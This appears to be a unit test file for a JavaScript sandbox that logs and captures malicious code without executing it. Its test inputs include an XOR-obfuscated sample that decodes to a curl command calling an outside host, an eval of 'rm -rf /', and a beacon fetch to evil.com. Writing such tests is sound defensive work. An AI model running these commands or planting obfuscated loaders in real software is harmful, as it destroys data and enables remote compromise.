import { describe, it, expect } from 'vitest';
import { runInSandbox } from '../src/sandbox-core';

describe('runInSandbox', () => {
  it('captures the final expression value (the XOR sample)', () => {
    const k = '3dS110o';
    const d = '5000731e455d1f1342751152451d5f447e427d10427244747c5e4a065f08321e041e5f134c1e50525901470b20590a10265d10365d117d0e50441c6211684f02500c0118102e43143f5466550d780d271e07005a1d557d00041047782c077c7d1c4f5f0d385411770a500f3c1811660a41173a5e5f1f5e044a631162510952163a1e07005a1d557d0004174f140c27454143551c4b30555f40004110325d1c451c1d1c2a4b1e431b5c163256541f0a4b143c43454340570b30421c0958765639001f531c4543731c5e100b5f4a295841104915443c41545e4f57087d4b5840';
    const source = `var k="${k}",d="${d}",r="";for(var i=0;i<d.length;i+=2)r+=String.fromCharCode(parseInt(d.substr(i,2),16)^k.charCodeAt(i/2%k.length));r`;
    const res = runInSandbox(source);
    expect(res.capturedStrings.some(s => s.includes('curl') && s.includes('cdnportal-us.xyz'))).toBe(true);
    expect(res.errors).toEqual([]);
  });

  it('logs eval args instead of executing them', () => {
    const res = runInSandbox(`eval("os.system('rm -rf /')")`);
    expect(res.events.some(e => e.kind === 'eval' && e.detail.includes('rm -rf'))).toBe(true);
  });

  it('logs network attempts without sending', () => {
    const res = runInSandbox(`fetch("https://evil.com/beacon"); "done"`);
    expect(res.events.some(e => e.kind === 'network' && e.detail.includes('evil.com'))).toBe(true);
  });

  it('restores globals afterwards', () => {
    const before = globalThis.fetch;
    runInSandbox(`"noop"`);
    expect(globalThis.fetch).toBe(before);
  });
});
